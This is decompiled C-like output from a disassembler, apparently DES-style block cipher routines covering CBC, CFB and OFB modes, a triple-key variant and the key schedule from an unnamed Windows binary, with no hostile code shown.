int __cdecl sub_4B9600(int *a1, int a2, int a3, _DWORD *a4, int *a5, int a6)
{
  int v6; // esi
  unsigned int v9; // ebp
  int result; // eax
  int v11; // ebx
  int v12; // ebx
  int v13; // ecx
  int v14; // edx
  unsigned int v15; // ebp
  int v16; // ebx
  int v17; // edx
  int v18; // ebx
  int v19; // ecx
  int v20; // edx
  int *v21; // [esp-Ch] [ebp-2Ch]
  _DWORD *v22; // [esp-8h] [ebp-28h]
  int v23; // [esp-4h] [ebp-24h]
  int v24; // [esp+0h] [ebp-20h] BYREF
  int v25; // [esp+4h] [ebp-1Ch]
  int v26; // [esp+8h] [ebp-18h]
  int v27; // [esp+Ch] [ebp-14h]

  v6 = *a5;
  v27 = a5[1];
  v26 = v6;
  v25 = v27;
  v24 = v6;
  v23 = a6;
  v22 = a4;
  v21 = &v24;
  if ( a6 )
  {
    v9 = a3 & 0xFFFFFFF8;
    result = v24;
    v11 = v25;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v12 = a1[1] ^ v11;
        v24 = *a1 ^ result;
        v25 = v12;
        sub_4B9240(v21, v22, v23);
        result = v24;
        v11 = v25;
        *(_DWORD *)a2 = v24;
        *(_DWORD *)(a2 + 4) = v11;
        a1 += 2;
        a2 += 8;
        v9 -= 8;
      }
      while ( v9 );
    }
    if ( (a3 & 7) != 0 )
    {
      while ( 2 )
      {
        v13 = 0;
        v14 = 0;
        switch ( a3 & 7 )
        {
          case 0:
            continue;
          case 1:
            goto LABEL_12;
          case 2:
            goto LABEL_11;
          case 3:
            BYTE1(v13) = *((_BYTE *)a1 + 2);
            v13 <<= 8;
LABEL_11:
            BYTE1(v13) = *((_BYTE *)a1 + 1);
LABEL_12:
            LOBYTE(v13) = *(_BYTE *)a1;
            goto LABEL_13;
          case 4:
            goto LABEL_9;
          case 5:
            goto LABEL_8;
          case 6:
            goto LABEL_7;
          case 7:
            BYTE1(v14) = *((_BYTE *)a1 + 6);
            v14 <<= 8;
LABEL_7:
            BYTE1(v14) = *((_BYTE *)a1 + 5);
LABEL_8:
            LOBYTE(v14) = *((_BYTE *)a1 + 4);
LABEL_9:
            v13 = *a1;
LABEL_13:
            v24 = v13 ^ result;
            v25 = v14 ^ v11;
            sub_4B9240(v21, v22, v23);
            result = v24;
            v11 = v25;
            *(_DWORD *)a2 = v24;
            *(_DWORD *)(a2 + 4) = v11;
            break;
        }
        break;
      }
    }
  }
  else
  {
    v15 = a3 & 0xFFFFFFF8;
    result = v26;
    v11 = v27;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v16 = a1[1];
        v24 = *a1;
        v25 = v16;
        sub_4B9240(v21, v22, v23);
        v17 = v25 ^ v27;
        result = *a1;
        v11 = a1[1];
        *(_DWORD *)a2 = v24 ^ v26;
        *(_DWORD *)(a2 + 4) = v17;
        v26 = result;
        v27 = v11;
        a1 += 2;
        a2 += 8;
        v15 -= 8;
      }
      while ( v15 );
    }
    if ( (a3 & 7) != 0 )
    {
      v18 = a1[1];
      v24 = *a1;
      v25 = v18;
      sub_4B9240(v21, v22, v23);
      v19 = v24 ^ v26;
      result = *a1;
      v11 = a1[1];
      v20 = __ROR4__(v25 ^ v27, 16);
      *(_BYTE *)(a2 + 6) = v20;
      *(_WORD *)(a2 + 4) = HIWORD(v20);
      *(_DWORD *)a2 = v19;
    }
  }
  *a5 = result;
  a5[1] = v11;
  return result;
}
// 4B9655: variable 'v21' is possibly undefined
// 4B9655: variable 'v22' is possibly undefined
// 4B9655: variable 'v23' is possibly undefined

//----- (004B9800) --------------------------------------------------------
int __cdecl sub_4B9800(int *a1, int a2, int a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, int *a7, int a8)
{
  int v8; // esi
  unsigned int v11; // ebp
  int result; // eax
  int v13; // ebx
  int v14; // ebx
  int v15; // ecx
  int v16; // edx
  unsigned int v17; // ebp
  int v18; // ebx
  int v19; // edx
  int v20; // ebx
  int v21; // ecx
  int v22; // edx
  int *v23; // [esp-10h] [ebp-30h]
  _DWORD *v24; // [esp-Ch] [ebp-2Ch]
  _DWORD *v25; // [esp-8h] [ebp-28h]
  _DWORD *v26; // [esp-4h] [ebp-24h]
  int v27; // [esp+0h] [ebp-20h] BYREF
  int v28; // [esp+4h] [ebp-1Ch]
  int v29; // [esp+8h] [ebp-18h]
  int v30; // [esp+Ch] [ebp-14h]

  v8 = *a7;
  v30 = a7[1];
  v29 = v8;
  v28 = v30;
  v27 = v8;
  v26 = a6;
  v25 = a5;
  v24 = a4;
  v23 = &v27;
  if ( a8 )
  {
    v11 = a3 & 0xFFFFFFF8;
    result = v27;
    v13 = v28;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v14 = a1[1] ^ v13;
        v27 = *a1 ^ result;
        v28 = v14;
        sub_4B93A0(v23, v24, v25, v26);
        result = v27;
        v13 = v28;
        *(_DWORD *)a2 = v27;
        *(_DWORD *)(a2 + 4) = v13;
        a1 += 2;
        a2 += 8;
        v11 -= 8;
      }
      while ( v11 );
    }
    if ( (a3 & 7) != 0 )
    {
      while ( 2 )
      {
        v15 = 0;
        v16 = 0;
        switch ( a3 & 7 )
        {
          case 0:
            continue;
          case 1:
            goto LABEL_12;
          case 2:
            goto LABEL_11;
          case 3:
            BYTE1(v15) = *((_BYTE *)a1 + 2);
            v15 <<= 8;
LABEL_11:
            BYTE1(v15) = *((_BYTE *)a1 + 1);
LABEL_12:
            LOBYTE(v15) = *(_BYTE *)a1;
            goto LABEL_13;
          case 4:
            goto LABEL_9;
          case 5:
            goto LABEL_8;
          case 6:
            goto LABEL_7;
          case 7:
            BYTE1(v16) = *((_BYTE *)a1 + 6);
            v16 <<= 8;
LABEL_7:
            BYTE1(v16) = *((_BYTE *)a1 + 5);
LABEL_8:
            LOBYTE(v16) = *((_BYTE *)a1 + 4);
LABEL_9:
            v15 = *a1;
LABEL_13:
            v27 = v15 ^ result;
            v28 = v16 ^ v13;
            sub_4B93A0(v23, v24, v25, v26);
            result = v27;
            v13 = v28;
            *(_DWORD *)a2 = v27;
            *(_DWORD *)(a2 + 4) = v13;
            break;
        }
        break;
      }
    }
  }
  else
  {
    v17 = a3 & 0xFFFFFFF8;
    result = v29;
    v13 = v30;
    if ( (a3 & 0xFFFFFFF8) != 0 )
    {
      do
      {
        v18 = a1[1];
        v27 = *a1;
        v28 = v18;
        sub_4B94D0(v23, v24, v25, v26);
        v19 = v28 ^ v30;
        result = *a1;
        v13 = a1[1];
        *(_DWORD *)a2 = v27 ^ v29;
        *(_DWORD *)(a2 + 4) = v19;
        v29 = result;
        v30 = v13;
        a1 += 2;
        a2 += 8;
        v17 -= 8;
      }
      while ( v17 );
    }
    if ( (a3 & 7) != 0 )
    {
      v20 = a1[1];
      v27 = *a1;
      v28 = v20;
      sub_4B94D0(v23, v24, v25, v26);
      v21 = v27 ^ v29;
      result = *a1;
      v13 = a1[1];
      v22 = __ROR4__(v28 ^ v30, 16);
      *(_BYTE *)(a2 + 6) = v22;
      *(_WORD *)(a2 + 4) = HIWORD(v22);
      *(_DWORD *)a2 = v21;
    }
  }
  *a7 = result;
  a7[1] = v13;
  return result;
}
// 4B985E: variable 'v23' is possibly undefined
// 4B985E: variable 'v24' is possibly undefined
// 4B985E: variable 'v25' is possibly undefined
// 4B985E: variable 'v26' is possibly undefined

//----- (004BA200) --------------------------------------------------------
int *__cdecl sub_4BA200(
        char *a1,
        _BYTE *a2,
        int a3,
        _DWORD *a4,
        _DWORD *a5,
        _DWORD *a6,
        unsigned __int16 *a7,
        int *a8,
        int a9)
{
  int *result; // eax
  int v10; // ecx
  int v11; // esi
  int v13; // edx
  int v14; // ebp
  unsigned __int16 v15; // ecx^2
  unsigned __int16 v16; // ecx^2
  char v17; // al
  int v19; // edx
  int v20; // ebp
  unsigned __int16 v21; // ecx^2
  unsigned __int16 v22; // ecx^2
  char v23; // al
  char v24; // dl
  int v25; // [esp+10h] [ebp-8h] BYREF
  int v26; // [esp+14h] [ebp-4h]
  int v27; // [esp+34h] [ebp+1Ch]
  int v28; // [esp+34h] [ebp+1Ch]

  result = a8;
  v10 = a3;
  v11 = *a8;
  if ( !a9 )
  {
    if ( a3 )
    {
      do
      {
        v28 = --v10;
        if ( !v11 )
        {
          v19 = *((unsigned __int8 *)a7 + 4);
          v20 = *((unsigned __int8 *)a7 + 5);
          v25 = (*((unsigned __int8 *)a7 + 3) << 24) | (*((unsigned __int8 *)a7 + 2) << 16) | *a7;
          v26 = (v20 << 8) | v19 | (a7[3] << 16);
          sub_4B93A0(&v25, a4, a5, a6);
          v21 = HIWORD(v25);
          *a7 = v25;
          a7[1] = v21;
          v22 = HIWORD(v26);
          a7[2] = v26;
          a7[3] = v22;
          v10 = v28;
        }
        v23 = *a1++;
        v24 = *((_BYTE *)a7 + v11);
        *((_BYTE *)a7 + v11) = v23;
        *a2 = v24 ^ v23;
        v11 = ((_BYTE)v11 + 1) & 7;
        ++a2;
      }
      while ( v10 );
      result = a8;
    }
    goto LABEL_12;
  }
  if ( !a3 )
  {
LABEL_12:
    *result = v11;
    return result;
  }
  do
  {
    v27 = --v10;
    if ( !v11 )
    {
      v13 = *((unsigned __int8 *)a7 + 4);
      v14 = *((unsigned __int8 *)a7 + 5);
      v25 = (*((unsigned __int8 *)a7 + 3) << 24) | (*((unsigned __int8 *)a7 + 2) << 16) | *a7;
      v26 = (v14 << 8) | v13 | (a7[3] << 16);
      sub_4B93A0(&v25, a4, a5, a6);
      v15 = HIWORD(v25);
      *a7 = v25;
      a7[1] = v15;
      v16 = HIWORD(v26);
      a7[2] = v26;
      a7[3] = v16;
      v10 = v27;
    }
    v17 = *a1++ ^ *((_BYTE *)a7 + v11);
    *a2 = v17;
    *((_BYTE *)a7 + v11) = v17;
    v11 = ((_BYTE)v11 + 1) & 7;
    ++a2;
  }
  while ( v10 );
  result = a8;
  *a8 = v11;
  return result;
}

//----- (004BA420) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4BA420(
        int a1,
        int a2,
        int a3,
        unsigned int a4,
        _DWORD *a5,
        _DWORD *a6,
        _DWORD *a7,
        unsigned __int8 *a8,
        int a9)
{
  unsigned __int8 *result; // eax
  unsigned int v11; // ebp
  int v13; // edx
  int v14; // ebx
  unsigned int v15; // eax
  int v16; // esi
  int v17; // ecx
  int v18; // eax
  int v19; // ecx
  int v20; // eax
  int v21; // edx
  int v22; // eax
  int v23; // eax
  int v24; // edx
  int v25; // edx
  int v26; // edx
  int v27; // eax
  int v28; // ecx
  int v29; // edi
  int v30; // ebx
  char v31; // dl
  char v32; // dl
  char v33; // dl
  char v34; // dl
  char v35; // dl
  char v36; // dl
  int v37; // ecx
  int v38; // eax
  int v39; // esi
  int v40; // eax
  int v41; // eax
  int v42; // edx
  int v43; // eax
  int v44; // eax
  int v45; // edx
  int v46; // edx
  int v47; // edx
  int v48; // ebx
  char v49; // dl
  char v50; // dl
  char v51; // dl
  char v52; // dl
  char v53; // dl
  char v54; // dl
  int v55; // eax
  int v56; // ecx
  int v57; // edi
  unsigned __int8 *v58; // esi
  unsigned int v59; // edx
  int v60; // [esp+8h] [ebp-40h]
  unsigned int v61; // [esp+Ch] [ebp-3Ch]
  int v62; // [esp+10h] [ebp-38h]
  int v63; // [esp+14h] [ebp-34h]
  int v64; // [esp+18h] [ebp-30h] BYREF
  unsigned int v65; // [esp+1Ch] [ebp-2Ch]
  _DWORD *v66; // [esp+20h] [ebp-28h]
  _DWORD *v67; // [esp+24h] [ebp-24h]
  _DWORD *v68; // [esp+28h] [ebp-20h]
  unsigned __int8 *v69; // [esp+2Ch] [ebp-1Ch]
  _BYTE *v70; // [esp+30h] [ebp-18h]
  int Src; // [esp+34h] [ebp-14h] BYREF
  int v72; // [esp+38h] [ebp-10h]
  int v73; // [esp+3Ch] [ebp-Ch]
  int v74; // [esp+40h] [ebp-8h]

  v66 = a6;
  v61 = a4;
  v68 = a5;
  result = a8;
  v11 = (unsigned int)(a3 + 7) >> 3;
  v67 = a7;
  v70 = a8;
  if ( a3 <= 64 )
  {
    v13 = a8[1] << 8;
    v69 = a8 + 1;
    v14 = (a8[3] << 24) | (a8[2] << 16) | v13 | *a8;
    v15 = ((a8[6] | (a8[7] << 8)) << 16) | *((unsigned __int16 *)a8 + 2);
    v60 = v15;
    if ( a9 )
    {
      if ( a4 >= v11 )
      {
        while ( 1 )
        {
          v61 -= v11;
          v65 = v15;
          v64 = v14;
          sub_4B93A0(&v64, v68, v66, v67);
          v16 = v11 + a1;
          v17 = 0;
          v18 = 0;
          switch ( v11 )
          {
            case 1u:
              goto LABEL_12;
            case 2u:
              goto LABEL_11;
            case 3u:
              goto LABEL_10;
            case 4u:
              goto LABEL_9;
            case 5u:
              goto LABEL_8;
            case 6u:
              goto LABEL_7;
            case 7u:
              goto LABEL_6;
            case 8u:
              v19 = *(unsigned __int8 *)--v16;
              v17 = v19 << 24;
LABEL_6:
              v20 = *(unsigned __int8 *)--v16;
              v17 |= v20 << 16;
LABEL_7:
              v21 = *(unsigned __int8 *)--v16;
              v17 |= v21 << 8;
LABEL_8:
              v22 = *(unsigned __int8 *)--v16;
              v17 |= v22;
LABEL_9:
              v23 = *(unsigned __int8 *)--v16;
              v18 = v23 << 24;
LABEL_10:
              v24 = *(unsigned __int8 *)--v16;
              v18 |= v24 << 16;
LABEL_11:
              v25 = *(unsigned __int8 *)--v16;
              v18 |= v25 << 8;
LABEL_12:
              v26 = *(unsigned __int8 *)--v16;
              v18 |= v26;
              break;
            default:
              break;
          }
          v27 = v64 ^ v18;
          v28 = v65 ^ v17;
          a1 = v11 + v16;
          v29 = v11 + a2;
          switch ( v11 )
          {
            case 1u:
              goto LABEL_21;
            case 2u:
              goto LABEL_20;
            case 3u:
              goto LABEL_19;
            case 4u:
              goto LABEL_18;
            case 5u:
              goto LABEL_17;
            case 6u:
              goto LABEL_16;
            case 7u:
              goto LABEL_15;
            case 8u:
              *(_BYTE *)--v29 = HIBYTE(v28);
LABEL_15:
              *(_BYTE *)--v29 = BYTE2(v28);
LABEL_16:
              *(_BYTE *)--v29 = BYTE1(v28);
LABEL_17:
              *(_BYTE *)--v29 = v28;
LABEL_18:
              *(_BYTE *)--v29 = HIBYTE(v27);
LABEL_19:
              *(_BYTE *)--v29 = BYTE2(v27);
LABEL_20:
              *(_BYTE *)--v29 = BYTE1(v27);
LABEL_21:
              *(_BYTE *)--v29 = v27;
              break;
            default:
              break;
          }
          a2 = v11 + v29;
          if ( a3 == 32 )
            break;
          if ( a3 != 64 )
          {
            Src = v14;
            v72 = v60;
            v73 = v27;
            v74 = v28;
            v30 = a3 % 8;
            memcpy_0(&Src, (char *)&Src + a3 / 8, (a3 % 8 != 0) + 8);
            if ( a3 % 8 )
            {
              LOBYTE(Src) = (_BYTE)Src << v30;
              v31 = BYTE1(Src) >> (8 - v30);
              BYTE1(Src) <<= v30;
              LOBYTE(Src) = v31 | Src;
              v32 = BYTE2(Src) >> (8 - v30);
              BYTE2(Src) <<= v30;
              BYTE1(Src) |= v32;
              v33 = HIBYTE(Src) >> (8 - v30);
              HIBYTE(Src) <<= v30;
              BYTE2(Src) |= v33;
              v34 = (unsigned __int8)v72 >> (8 - v30);
              LOBYTE(v72) = (_BYTE)v72 << v30;
              HIBYTE(Src) |= v34;
              v35 = BYTE1(v72) >> (8 - v30);
              BYTE1(v72) <<= v30;
              LOBYTE(v72) = v35 | v72;
              v36 = BYTE2(v72) >> (8 - v30);
              BYTE2(v72) <<= v30;
              BYTE1(v72) |= v36;
              BYTE2(v72) |= HIBYTE(v72) >> (8 - v30);
              HIBYTE(v72) = ((unsigned __int8)v73 >> (8 - v30)) | (HIBYTE(v72) << v30);
            }
            v14 = (HIBYTE(Src) << 24) | (BYTE2(Src) << 16) | (unsigned __int16)Src;
            v27 = v72;
            goto LABEL_29;
          }
          v14 = v27;
          v60 = v28;
LABEL_30:
          v15 = v60;
          if ( v61 < v11 )
            goto LABEL_59;
        }
        v14 = v60;
LABEL_29:
        v60 = v27;
        goto LABEL_30;
      }
    }
    else if ( a4 >= v11 )
    {
      do
      {
        v61 -= v11;
        v65 = v15;
        v64 = v14;
        sub_4B93A0(&v64, v68, v66, v67);
        v37 = 0;
        v38 = 0;
        v39 = v11 + a1;
        v63 = 0;
        v62 = 0;
        switch ( v11 )
        {
          case 1u:
            goto LABEL_41;
          case 2u:
            goto LABEL_40;
          case 3u:
            goto LABEL_39;
          case 4u:
            goto LABEL_38;
          case 5u:
            goto LABEL_37;
          case 6u:
            goto LABEL_36;
          case 7u:
            goto LABEL_35;
          case 8u:
            v40 = *(unsigned __int8 *)--v39;
            v37 = v40 << 24;
LABEL_35:
            v41 = *(unsigned __int8 *)--v39;
            v37 |= v41 << 16;
LABEL_36:
            v42 = *(unsigned __int8 *)--v39;
            v37 |= v42 << 8;
LABEL_37:
            v43 = *(unsigned __int8 *)--v39;
            v37 |= v43;
            v63 = v37;
LABEL_38:
            v44 = *(unsigned __int8 *)--v39;
            v38 = v44 << 24;
LABEL_39:
            v45 = *(unsigned __int8 *)--v39;
            v38 |= v45 << 16;
LABEL_40:
            v46 = *(unsigned __int8 *)--v39;
            v38 |= v46 << 8;
LABEL_41:
            v47 = *(unsigned __int8 *)--v39;
            v38 |= v47;
            v62 = v38;
            break;
          default:
            break;
        }
        a1 = v11 + v39;
        if ( a3 == 32 )
        {
          v14 = v60;
          v60 = v38;
        }
        else if ( a3 == 64 )
        {
          v14 = v38;
          v60 = v37;
        }
        else
        {
          Src = v14;
          v72 = v60;
          v73 = v38;
          v74 = v37;
          v48 = a3 % 8;
          memcpy_0(&Src, (char *)&Src + a3 / 8, (a3 % 8 != 0) + 8);
          if ( a3 % 8 )
          {
            LOBYTE(Src) = (_BYTE)Src << v48;
            v49 = BYTE1(Src) >> (8 - v48);
            BYTE1(Src) <<= v48;
            LOBYTE(Src) = v49 | Src;
            v50 = BYTE2(Src) >> (8 - v48);
            BYTE2(Src) <<= v48;
            BYTE1(Src) |= v50;
            v51 = HIBYTE(Src) >> (8 - v48);
            HIBYTE(Src) <<= v48;
            BYTE2(Src) |= v51;
            v52 = (unsigned __int8)v72 >> (8 - v48);
            LOBYTE(v72) = (_BYTE)v72 << v48;
            HIBYTE(Src) |= v52;
            v53 = BYTE1(v72) >> (8 - v48);
            BYTE1(v72) <<= v48;
            LOBYTE(v72) = v53 | v72;
            v54 = BYTE2(v72) >> (8 - v48);
            BYTE2(v72) <<= v48;
            BYTE1(v72) |= v54;
            BYTE2(v72) |= HIBYTE(v72) >> (8 - v48);
            HIBYTE(v72) = ((unsigned __int8)v73 >> (8 - v48)) | (HIBYTE(v72) << v48);
          }
          v14 = (HIBYTE(Src) << 24) | (BYTE2(Src) << 16) | (unsigned __int16)Src;
          v37 = v63;
          v60 = v72;
          v38 = v62;
        }
        v55 = v64 ^ v38;
        v56 = v65 ^ v37;
        v57 = v11 + a2;
        switch ( v11 )
        {
          case 1u:
            goto LABEL_57;
          case 2u:
            goto LABEL_56;
          case 3u:
            goto LABEL_55;
          case 4u:
            goto LABEL_54;
          case 5u:
            goto LABEL_53;
          case 6u:
            goto LABEL_52;
          case 7u:
            goto LABEL_51;
          case 8u:
            *(_BYTE *)--v57 = HIBYTE(v56);
LABEL_51:
            *(_BYTE *)--v57 = BYTE2(v56);
LABEL_52:
            *(_BYTE *)--v57 = BYTE1(v56);
LABEL_53:
            *(_BYTE *)--v57 = v56;
LABEL_54:
            *(_BYTE *)--v57 = HIBYTE(v55);
LABEL_55:
            *(_BYTE *)--v57 = BYTE2(v55);
LABEL_56:
            *(_BYTE *)--v57 = BYTE1(v55);
LABEL_57:
            *(_BYTE *)--v57 = v55;
            break;
          default:
            break;
        }
        v15 = v60;
        a2 = v11 + v57;
      }
      while ( v61 >= v11 );
    }
LABEL_59:
    v58 = v69;
    *v70 = v14;
    *v58++ = BYTE1(v14);
    *v58++ = BYTE2(v14);
    *v58++ = HIBYTE(v14);
    *v58++ = v15;
    *v58++ = BYTE1(v15);
    v59 = HIWORD(v15);
    result = (unsigned __int8 *)HIBYTE(v15);
    *v58 = v59;
    v58[1] = (unsigned __int8)result;
  }
  return result;
}

//----- (004BAB40) --------------------------------------------------------
unsigned __int8 *__cdecl sub_4BAB40(unsigned __int8 *a1)
{
  unsigned __int8 *result; // eax
  int v2; // ecx
  char v3; // dl
  int v4; // ecx
  char v5; // dl
  int v6; // ecx
  char v7; // dl
  int v8; // ecx
  char v9; // dl
  int v10; // ecx
  char v11; // dl
  int v12; // ecx
  char v13; // dl
  int v14; // ecx

  result = a1;
  v2 = a1[1];
  *a1 = byte_529928[*a1];
  v3 = byte_529928[v2];
  v4 = a1[2];
  a1[1] = v3;
  v5 = byte_529928[v4];
  v6 = a1[3];
  a1[2] = v5;
  v7 = byte_529928[v6];
  v8 = a1[4];
  a1[3] = v7;
  v9 = byte_529928[v8];
  v10 = a1[5];
  a1[4] = v9;
  v11 = byte_529928[v10];
  v12 = a1[6];
  a1[5] = v11;
  v13 = byte_529928[v12];
  v14 = a1[7];
  a1[6] = v13;
  a1[7] = byte_529928[v14];
  return result;
}

//----- (004BABD0) --------------------------------------------------------
_DWORD *__cdecl sub_4BABD0(unsigned __int16 *a1, _DWORD *a2)
{
  int v2; // ecx
  int v3; // esi
  int v4; // edx
  unsigned int v5; // ecx
  unsigned int v6; // edx
  int v7; // esi
  unsigned int v8; // ecx
  int v9; // edx
  _DWORD *result; // eax
  int v11; // esi
  unsigned int v12; // edx
  int v13; // ecx
  int v14; // esi
  int v15; // ecx
  unsigned int v16; // edi
  _DWORD *v17; // edx
  unsigned int v18; // ecx
  unsigned int v19; // esi
  unsigned int v20; // ecx
  unsigned int v21; // ebx
  unsigned int v22; // edi
  unsigned int v23; // esi
  unsigned int v24; // ebx
  unsigned int v25; // ecx
  unsigned int v26; // edx
  _DWORD *v27; // eax
  _DWORD *v28; // eax
  int v29; // edi
  int v30; // ebp
  unsigned int v31; // edi
  unsigned int v32; // ebp
  unsigned int v33; // ecx
  unsigned int v34; // edx
  _DWORD *v35; // eax
  _DWORD *v36; // eax
  int v37; // esi
  int v38; // ebx
  unsigned int v39; // esi
  unsigned int v40; // ebx
  unsigned int v41; // ecx
  unsigned int v42; // edx
  _DWORD *v43; // eax
  _DWORD *v44; // eax
  int v45; // ecx
  int v46; // edi
  unsigned int v47; // edx
  unsigned int v48; // esi
  _DWORD *v49; // eax
  _DWORD *v50; // [esp+Ch] [ebp-4h]

  v2 = (*((unsigned __int8 *)a1 + 3) << 24) | (*((unsigned __int8 *)a1 + 2) << 16) | *a1;
  v3 = (v2 ^ (*((_DWORD *)a1 + 1) >> 4)) & 0xF0F0F0F;
  v4 = (16 * v3) ^ *((_DWORD *)a1 + 1);
  v5 = (v3 ^ v2 ^ ((v3 ^ v2) << 18)) & 0xCCCC0000 ^ (((v3 ^ v2 ^ ((v3 ^ v2) << 18)) & 0xCCCC0000) >> 18) ^ v3 ^ v2;
  v6 = (v4 ^ (v4 << 18)) & 0xCCCC0000 ^ (((v4 ^ (v4 << 18)) & 0xCCCC0000) >> 18) ^ v4;
  v7 = (v5 ^ (v6 >> 1)) & 0x55555555;
  v8 = v7 ^ v5;
  v9 = (2 * v7) ^ v6;
  result = a2;
  v11 = (v9 ^ (v8 >> 8)) & 0xFF00FF;
  v12 = v11 ^ v9;
  v13 = (v11 << 8) ^ v8;
  v14 = (v13 ^ (v12 >> 1)) & 0x55555555;
  v15 = v14 ^ v13;
  v16 = ((2 * v14) ^ v12) & 0xFF00 | ((unsigned __int8)((2 * v14) ^ v12) << 16) | ((v15 & 0xF000000F | (((2 * v14) ^ v12) >> 12) & 0xFF0) >> 4);
  v17 = &unk_52A2AC;
  v18 = v15 & 0xFFFFFFF;
  v50 = &unk_52A2AC;
  do
  {
    if ( *(v17 - 1) )
    {
      v19 = v18 << 26;
      v20 = v18 >> 2;
      v21 = v16 << 26;
      v22 = v16 >> 2;
    }
    else
    {
      v19 = v18 << 27;
      v20 = v18 >> 1;
      v21 = v16 << 27;
      v22 = v16 >> 1;
    }
    v23 = (v20 | v19) & 0xFFFFFFF;
    v24 = (v22 | v21) & 0xFFFFFFF;
    v25 = dword_529AA8[v23 & 0x3F] | dword_529BA8[(v23 & 0xC0 | (v23 >> 1) & 0xF00) >> 6] | dword_529CA8[(v23 & 0x1E000 | (v23 >> 1) & 0x60000) >> 13] | dword_529DA8[(v23 & 0x100000 | ((v23 & 0xC00000 | (v23 >> 1) & 0x7000000) >> 1)) >> 20];
    v26 = (dword_529EA8[v24 & 0x3F] | dword_52A0A8[(v24 >> 15) & 0x3F] | dword_529FA8[(v24 & 0x180 | (v24 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v24 & 0x1E00000 | (v24 >> 1) & 0x6000000) >> 21]) & 0xFFFF0000;
    *result = __ROR4__(
                ((dword_529EA8[v24 & 0x3F] | dword_52A0A8[(v24 >> 15) & 0x3F] | dword_529FA8[(v24 & 0x180 | (v24 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v24 & 0x1E00000 | (v24 >> 1) & 0x6000000) >> 21]) << 16) | (unsigned __int16)v25,
                30);
    v27 = result + 1;
    *v27 = __ROR4__(v26 | HIWORD(v25), 26);
    v28 = v27 + 1;
    if ( *v50 )
    {
      v29 = (v23 >> 2) | (v23 << 26);
      v30 = (v24 >> 2) | (v24 << 26);
    }
    else
    {
      v29 = (v23 >> 1) | (v23 << 27);
      v30 = (v24 >> 1) | (v24 << 27);
    }
    v31 = v29 & 0xFFFFFFF;
    v32 = v30 & 0xFFFFFFF;
    v33 = dword_529AA8[v31 & 0x3F] | dword_529BA8[(v31 & 0xC0 | (v31 >> 1) & 0xF00) >> 6] | dword_529CA8[(v31 & 0x1E000 | (v31 >> 1) & 0x60000) >> 13] | dword_529DA8[(v31 & 0x100000 | ((v31 & 0xC00000 | (v31 >> 1) & 0x7000000) >> 1)) >> 20];
    v34 = (dword_529EA8[v32 & 0x3F] | dword_52A0A8[(v32 >> 15) & 0x3F] | dword_529FA8[(v32 & 0x180 | (v32 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v32 & 0x1E00000 | (v32 >> 1) & 0x6000000) >> 21]) & 0xFFFF0000;
    *v28 = __ROR4__(
             ((dword_529EA8[v32 & 0x3F] | dword_52A0A8[(v32 >> 15) & 0x3F] | dword_529FA8[(v32 & 0x180 | (v32 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v32 & 0x1E00000 | (v32 >> 1) & 0x6000000) >> 21]) << 16) | (unsigned __int16)v33,
             30);
    v35 = v28 + 1;
    *v35 = __ROR4__(v34 | HIWORD(v33), 26);
    v36 = v35 + 1;
    if ( v50[1] )
    {
      v37 = (v31 >> 2) | (v31 << 26);
      v38 = (v32 >> 2) | (v32 << 26);
    }
    else
    {
      v37 = (v31 >> 1) | (v31 << 27);
      v38 = (v32 >> 1) | (v32 << 27);
    }
    v39 = v37 & 0xFFFFFFF;
    v40 = v38 & 0xFFFFFFF;
    v41 = dword_529AA8[v39 & 0x3F] | dword_529BA8[(v39 & 0xC0 | (v39 >> 1) & 0xF00) >> 6] | dword_529CA8[(v39 & 0x1E000 | (v39 >> 1) & 0x60000) >> 13] | dword_529DA8[(v39 & 0x100000 | ((v39 & 0xC00000 | (v39 >> 1) & 0x7000000) >> 1)) >> 20];
    v42 = (dword_529EA8[v40 & 0x3F] | dword_52A0A8[(v40 >> 15) & 0x3F] | dword_529FA8[(v40 & 0x180 | (v40 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v40 & 0x1E00000 | (v40 >> 1) & 0x6000000) >> 21]) & 0xFFFF0000;
    *v36 = __ROR4__(
             ((dword_529EA8[v40 & 0x3F] | dword_52A0A8[(v40 >> 15) & 0x3F] | dword_529FA8[(v40 & 0x180 | (v40 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v40 & 0x1E00000 | (v40 >> 1) & 0x6000000) >> 21]) << 16) | (unsigned __int16)v41,
             30);
    v43 = v36 + 1;
    *v43 = __ROR4__(v42 | HIWORD(v41), 26);
    v44 = v43 + 1;
    if ( v50[2] )
    {
      v45 = (v39 >> 2) | (v39 << 26);
      v46 = (v40 >> 2) | (v40 << 26);
    }
    else
    {
      v45 = (v39 >> 1) | (v39 << 27);
      v46 = (v40 >> 1) | (v40 << 27);
    }
    v18 = v45 & 0xFFFFFFF;
    v16 = v46 & 0xFFFFFFF;
    v47 = dword_529AA8[v18 & 0x3F] | dword_529BA8[(v18 & 0xC0 | (v18 >> 1) & 0xF00) >> 6] | dword_529CA8[(v18 & 0x1E000 | (v18 >> 1) & 0x60000) >> 13] | dword_529DA8[(v18 & 0x100000 | ((v18 & 0xC00000 | (v18 >> 1) & 0x7000000) >> 1)) >> 20];
    v48 = (dword_529EA8[v16 & 0x3F] | dword_52A0A8[(v16 >> 15) & 0x3F] | dword_529FA8[(v16 & 0x180 | (v16 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v16 & 0x1E00000 | (v16 >> 1) & 0x6000000) >> 21]) & 0xFFFF0000;
    *v44 = __ROR4__(
             ((dword_529EA8[v16 & 0x3F] | dword_52A0A8[(v16 >> 15) & 0x3F] | dword_529FA8[(v16 & 0x180 | (v16 >> 1) & 0x1E00) >> 7] | dword_52A1A8[(v16 & 0x1E00000 | (v16 >> 1) & 0x6000000) >> 21]) << 16) | (unsigned __int16)v47,
             30);
    v49 = v44 + 1;
    *v49 = __ROR4__(v48 | HIWORD(v47), 26);
    v17 = v50 + 4;
    result = v49 + 1;
    v50 += 4;
  }
  while ( (int)v50 < (int)&SHA256_Constants_52A2EC );
  return result;
}
// 529AA8: using guessed type int dword_529AA8[64];
